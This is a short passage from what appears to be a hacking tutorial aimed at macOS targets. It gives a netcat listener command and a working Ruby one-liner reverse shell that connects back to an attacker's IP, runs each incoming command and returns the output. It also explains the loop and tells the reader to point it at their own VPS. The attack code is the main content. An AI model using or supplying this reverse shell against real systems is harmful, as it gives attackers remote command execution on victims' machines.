Same attack like other script language, can be insert in a file or a pastebin web application.

	nc -l -p 8080 (on kali)

	ruby -rsocket -e "c=TCPSocket.new('1.2.3.4','9999');while(cmd=c.gets);IO.popen(cmd,'r'){|io|c.print io.read}end"

This one-liner above will create a TCP socket (TCPSocket.new) and a while loop (while ... end) that says "while there's data coming in, assign it to cmd, run the input as a shell command, and print it back in our terminal (IO.popen(cmd,'r'){|io|c.print io.read})." Essentially, we're telling Ruby to take the command we submit, execute it, interpret the output, and send it back to us ... over and over again until we break the connection to the macOS device.

Remember to change the IP address (1.2.3.4) and port number (9999) to match the Netcat listener created in the previous step. This can be a local network IP address or IP address of your VPS. On the attacker's system (as shown below), the Netcat terminal will show a new connection was established.
